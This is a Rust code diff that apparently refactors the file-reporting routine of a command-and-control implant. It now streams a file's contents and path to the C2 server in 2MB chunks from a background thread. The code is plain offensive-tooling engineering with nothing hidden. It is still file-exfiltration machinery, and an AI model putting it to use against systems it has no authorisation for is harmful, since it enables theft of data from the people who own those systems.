@@ -30,54 +30,77 @@ impl StdReportLibrary {
 
 impl ReportLibrary for StdReportLibrary {
     fn file(&self, path: String) -> Result<(), String> {
-        let content = std::fs::read(&path).map_err(|e| e.to_string())?;
+        // Use a channel to stream file chunks
+        let (tx, rx) = std::sync::mpsc::channel();
+        let task_id = self.task_id;
+        let path_clone = path.clone();
 
-        // 2MB chunk size to stay safely under 4MB gRPC limit
-        let chunk_size = 2 * 1024 * 1024;
-        let chunks: Vec<Vec<u8>> = content
-            .chunks(chunk_size)
-            .map(|chunk| chunk.to_vec())
-            .collect();
+        let file_handle = std::fs::File::open(&path).map_err(|e| e.to_string())?;
 
-        let mut reqs = Vec::new();
-        for (i, chunk) in chunks.into_iter().enumerate() {
-            let metadata = if i == 0 {
-                Some(eldritch::FileMetadata {
-                    path: path.clone(),
-                    ..Default::default()
-                })
-            } else {
-                None
-            };
+        // Spawn a thread to read the file and feed the channel
+        std::thread::spawn(move || {
+            let mut file = file_handle;
 
-            let file_msg = eldritch::File {
-                metadata,
-                chunk,
-            };
+            use std::io::Read;
+            // 2MB chunk buffer
+            let chunk_size = 2 * 1024 * 1024;
+            let mut buffer = alloc::vec![0u8; chunk_size];
+            let mut first_chunk = true;
 
-            reqs.push(c2::ReportFileRequest {
-                task_id: self.task_id,
-                chunk: Some(file_msg),
-            });
-        }
+            loop {
+                match file.read(&mut buffer) {
+                    Ok(0) => {
+                        // EOF
+                        if first_chunk {
+                            // Send at least one empty request with metadata for empty files
+                            let metadata = eldritch::FileMetadata {
+                                path: path_clone.clone(),
+                                ..Default::default()
+                            };
+                            let file_msg = eldritch::File {
+                                metadata: Some(metadata),
+                                chunk: Vec::new(),
+                            };
+                            let req = c2::ReportFileRequest {
+                                task_id,
+                                chunk: Some(file_msg),
+                            };
+                            let _ = tx.send(req);
+                        }
+                        break;
+                    }
+                    Ok(n) => {
+                        let chunk = buffer[..n].to_vec();
+                        let metadata = if first_chunk {
+                            Some(eldritch::FileMetadata {
+                                path: path_clone.clone(),
+                                ..Default::default()
+                            })
+                        } else {
+                            None
+                        };
+                        first_chunk = false;
 
-        if reqs.is_empty() {
-            // Send at least one empty request with metadata for empty files
-            let metadata = eldritch::FileMetadata {
-                path: path.clone(),
-                ..Default::default()
-            };
-            let file_msg = eldritch::File {
-                metadata: Some(metadata),
-                chunk: Vec::new(),
-            };
-            reqs.push(c2::ReportFileRequest {
-                task_id: self.task_id,
-                chunk: Some(file_msg),
-            });
-        }
+                        let file_msg = eldritch::File { metadata, chunk };
+                        let req = c2::ReportFileRequest {
+                            task_id,
+                            chunk: Some(file_msg),
+                        };
 
-        self.agent.report_file(reqs).map(|_| ())
+                        if tx.send(req).is_err() {
+                            break; // Receiver dropped
+                        }
+                    }
+                    Err(_e) => {
+                        break;
+                    }
+                }
+            }
+        });
+
+        self.agent
+            .report_file(alloc::boxed::Box::new(rx.into_iter()))
+            .map(|_| ())
     }
 
     fn process_list(&self, list: Vec<BTreeMap<String, Value>>) -> Result<(), String> {
